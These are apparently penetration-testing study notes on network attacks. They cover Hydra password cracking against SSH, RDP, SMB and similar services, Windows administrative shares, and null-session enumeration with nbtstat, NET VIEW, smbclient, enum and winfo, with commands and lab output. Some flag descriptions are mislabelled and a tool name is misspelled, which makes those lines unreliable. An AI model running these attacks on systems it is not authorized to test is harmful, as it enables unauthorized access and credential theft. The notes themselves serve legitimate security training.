# Network Attacks

## Authentication Cracking

### Hydra
Fast, parallelized network authentication cracker.

Can attack nearly 50 different service types, including:
- SSH
- RDP
- Telnet
- FTP
- SMB
- HTTP
- IMAP

To learn more about a module, use the `-U` argument
```bash
# hydra -U rdp
```

To launch a dictionary attack against a service, with a list of usernames and passwords,
```bash
# hydra -L usernames.txt -P passwordlist.txt <service://server> <options>
```

## Windows Shares

### NetBIOS
Windows clients use NetBIOS when viewing network shares on a LAN

UDP
- name resolution
- one-to-many datagrams

TCP
- file transfers using NetBIOS sessions

### Shares

#### Administrative Shares
Special default administrative shares used by sysadmins
`\\ComputerName\C$` lets an admin access a volume on a PC
`\\ComputerName\admin$` points to %WINDIR%
`\\ComputerName\ipc$` is used for IPC

## Null Sessions
Seen on legacy hosts.

A null session attack allows an attacker connect to a local/remote share without authentication.

Null session attacks can be used to enumerate a lot of information.

Attackers can steal information about:
- Passwords
- System users
- System groups
- Running system processes

### Enumerating network shares
#### `nbtstat`
`nbtstat` is a Windows CLI tool that can display information about a target by enumerating Windows shares.

```cmd
> nbtstat -A 10.130.40.80


Name                Type        Status
--------------------------------------
ELS-WINXP   <00>  UNIQUE
WORKGROUP   <00>  GROUP
ELS-WINXP   <20>  UNIQUE
```
`ELS-WINXP  <00>  UNIQUE` tells us that the machine is a WinxP workstation (`<00>`), with a unique IP.
`WORKGROUP   <00>  GROUP` tells us the workgroup/domain it is joiend to.
`ELS-WINXP   <20>  UNIQUE` tells us that the file sharing service is running (`<20>`).

#### `NET VIEW`
An attacker can enumerate the shares by using the `NET VIEW` command.

```cmd
> NET VIEW 10.130.40.80
Shared resources at 10.130.40.80

Share name    Type    Used as   Comment
---------------------------------------
eLS           Disk
WIA_RIS_SHARE Disk
The command completed successfully
```

#### `nmblookup`
You can perform shares enumeration from Linux.
```bash
# nmblookup -A 10.130.40.80
Looking up status of 10.130.40.80
  ELS-WINXP   <00>  -         M <ACTIVE>
  WORKGROUP   <00>  - <GROUP> M <ACTIVE>
  ELS-WINXP   <20>  -         M <ACTIVE>
  WORKGROUP   <1e>  - <GROUP> M <ACTIVE>
  
  MAC Address = 00-0C-29-BF-98-BD
```

#### `smbclient`
`smbclient` is an FTP-like client that can access Windows shares.

```bash
$ smbclient -L //10.130.40.80 -N
```
`-L` allows you to look at what services are available on a target
`-N` forces the tool to not ask for a password

### Checking for Null sessions
Attempt to connect to the `IPC$` Administrative share.

#### With Windows
```cmd
> NET USE \\<target_IP_Address>\IPC$ '' /uL''
```
#### With Linux
```bash
# smbclient //<target_IP_Address>/IPC$ -N

# smbclient //<target_IP_Address>/C$ -N
```

### Exploiting Null Sessions

#### `enum` in Windows

```cmd
> enum -S <target_IP>
```
`-S` enumerates the shares (including administrative) of a PC.

```cmd
> enum -U <target_IP>
```
`-S` enumerates the users.

```cmd
> enum -P <target_IP>
```
`-S` checks the password policy.


#### `winfo` in Windows
```cmd
> winfo <target_IP> -n
```
`-n` tells the tool to use null sessions.

#### `enuml4linux` in Linux
A Perl script that performs the same operations as `enum` and `winfo`

Uses the same syntax as `enum`.
